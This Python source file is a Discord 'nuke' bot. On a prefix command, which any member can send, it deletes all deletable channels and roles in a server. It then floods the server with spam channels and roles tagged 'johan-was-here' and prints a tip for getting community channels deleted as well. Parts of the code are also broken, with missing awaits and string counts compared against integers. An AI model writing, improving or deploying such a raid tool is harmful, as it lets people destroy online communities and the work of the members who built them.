import discord, asyncio
from colorama import Fore

print(Fore.WHITE)
try:
    with open("config.txt") as file:
        token = file.readline()
        prefix = file.readline()
except:
    print(Fore.RED + "Error: Check your 'config.txt' file for any mistakes")

if prefix == "":
    print(Fore.YELLOW + "Warning: Variable 'prefix' is set as whitespace")

client = discord.Client(intents=discord.Intents.all())

print(Fore.BLACK)

@client.event
async def on_ready():
    print(Fore.WHITE + f"User: {client.user}")
    print(f"Prefix: {prefix}")

@client.event
async def on_message(message):
    msg = message.content
    if msg.startswith(f"{prefix}help"):
        print(Fore.GREEN + f"\n'{prefix}help' command used!")
        try:
            await message.reply("W.I.P.")
        except:
            print(Fore.YELLOW + f"Warning: '{prefix}help' command unsuccessfully ran")
        
    async def del_channels():
        print(Fore.WHITE + "\nDeleting all the channels...")
        for channel in message.guild.channels:
            try:
                await channel.delete()
                print(Fore.GREEN + "Channel deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete channel.")
        print(Fore.WHITE + "All channels that can be deleted have been deleted. Tip: disable community to delete the rules and community updates channels.")
    
    async def del_roles():
        print(Fore.WHITE + "\nDeleting all the roles...")
        for role in message.guild.roles:
            try:
                await role.delete()
                print(Fore.GREEN + f"Role deleted!")
            except:
                print(Fore.YELLOW + "Unable to delete role.")
        print(Fore.WHITE + "All roles that can be deleted have been deleted.")
    
    async def mass_channels(amount, channel_name):
        print(Fore.WHITE + "\nMass channel creation is in progress...")
        channels_made = 0
        if auto == False:
            command = msg.split(" ")
            amount = command[1]
            channel_name = command[2]
        while channels_made < amount:
            try:
                await message.guild.create_text_channel(channel_name)
                channels_made += 1
                print(Fore.GREEN + "Text channel created!")
            except:
                print(Fore.YELLOW + "Unable to create text channel.")
                await asyncio.sleep(0.3)
        print(Fore.WHITE + "Mass channel creation has been finished!")

    async def mass_roles(amount, role_name):
        print(Fore.WHITE + "\nMass role creation is in progress...")
        roles_made = 0
        if auto == False:
            command = msg.split(" ")
            amount = command[1]
            role_name = command[2]
        while roles_made < amount:
            try:
                await message.guild.create_role(name=role_name)
                roles_made += 1
                print(Fore.GREEN + "Role has been created!")
            except:
                print(Fore.YELLOW + "Unable to create role.")
                await asyncio.sleep(0.3)
        print(Fore.WHITE + "Mass role creation has been finished!")

    auto = False

    if msg.startswith(f"{prefix}nuke"):
        await del_channels()
        await del_roles()
        auto = True
        await mass_channels(5, "johan-was-here")
        await mass_roles(5, "J0HAN WAS HERE")
        auto = False
        print(Fore.GREEN + "\nNuke has been finished!")

    if msg.startswith(f"{prefix}del"):
        del_channels()
        del_roles()
        print(Fore.GREEN + "Deletion of channels & roles has been complete!")
    
    if msg.startswith(f"{prefix}cdel"):
        del_channels()

    if msg.startswith(f"{prefix}rdel"):
        del_roles()

client.run(token)
